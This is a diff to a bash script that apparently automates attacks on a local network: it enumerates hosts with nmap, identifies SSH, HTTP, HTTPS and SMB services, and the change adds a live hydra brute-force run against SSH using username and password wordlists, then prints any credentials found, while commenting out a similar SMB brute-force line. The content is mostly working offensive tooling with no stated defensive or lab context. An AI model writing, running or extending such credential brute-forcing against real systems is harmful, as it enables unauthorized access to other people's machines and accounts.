@@ -10,6 +10,7 @@ fi
 network_ssid=$(iwgetid -r)
 gateway=$(ip route | grep -v 'default' | awk '{print $1}')
 wordlist="/usr/share/wordlists/dirb/small.txt"
+localhost=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
 
 clear
 printf '   _  __    __  ___   ____
@@ -51,7 +52,7 @@ i=0
 
 while [ $i -lt ${#ips[@]} ]
 do
-    printf "\n[*] Scanning ip %s($((i+1))/${#ips[@]}) - ${ips[$i]}\n"
+    printf "\n[*] Scanning ip %s($((i+1))/${#ips[@]}) - ${ips[$i]}...\n"
     # printf "[i] IP %s${ips[$i]} have ${#ports[$i]} open ports"
     
     mapfile -t ports < <(nmap -vv "${ips[$i]}" | grep "Discovered open port" | awk '{print $6":"$4}' | awk -F: '{print $2}' | grep -o '[0-9]\+')  
@@ -59,6 +60,7 @@ do
     if [ ${#ports[@]} -gt 0 ]
     then
         printf "[i] Host have\e[92m %s${#ports[@]}\e[0m open ports [\e[94m %s${ports[*]}\e[0m ]"
+        printf "\n[*] Checking services & running modules...\n"
     else
         printf "[i] Host have\e[91m %s${#ports[@]}\e[0m open ports"
     fi
@@ -67,20 +69,22 @@ do
     # do
     # printf "\n[*] Attepting to bruteforce services...\n"
     # done
+    
 
     y=0
     while [ $y -lt ${#ports[*]} ]
     do
-        printf "\n[*] Attepting to bruteforce services...\n"
+   # count=$(ls modules/${ports[$y]}/ -1q | wc -l)
+        
          if [ "${ports[$y]}" == "80" ]
             then
                 printf "[i] \e[92mHTTP\e[0m service detected!\n"
             elif [ "${ports[$y]}" == "22" ]
             then 
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
-                # nmap -p 22 "${ips[$i]}" --script ssh-brute --script-args userdb=user.txt,passdb=pass.txt
-
-
+                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ssh -f -o brute.txt
+                cat brute.txt | awk '/login/{print "Creds found -> "  $5":" $7}'
+                read -p "Press [ENTER] to continue!"
             elif [ "${ports[$y]}" == "443" ]
             then 
                 printf "[i] \e[92mHTTPS\e[0m service detected!\n"
@@ -101,7 +105,7 @@ do
 
             then 
                 printf "[i] \e[92mSMB\e[0m service detected!\n"
-                hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb
+                #   hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb
 
             else
                 printf "[!] Service on port \e[94m%s${ports[$y]}\e[0m is not supported yet! Skipping...\n"
